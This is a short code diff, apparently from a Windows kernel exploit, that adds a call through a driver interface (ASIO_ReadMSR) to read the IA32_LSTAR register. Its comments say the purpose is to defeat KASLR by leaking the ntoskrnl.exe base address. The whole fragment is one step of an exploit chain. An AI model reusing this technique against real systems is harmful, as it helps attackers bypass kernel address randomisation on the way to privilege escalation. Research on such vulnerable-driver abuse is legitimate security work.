@@ -1,0 +1,4 @@
+# Read IA32_LSTAR — address of the syscall handler
+# Defeats KASLR: reveals the ntoskrnl.exe base address
+lstar = asio.ASIO_ReadMSR(0xC0000082)
+# ntoskrnl base = lstar - known_offset_of_KiSystemCall64
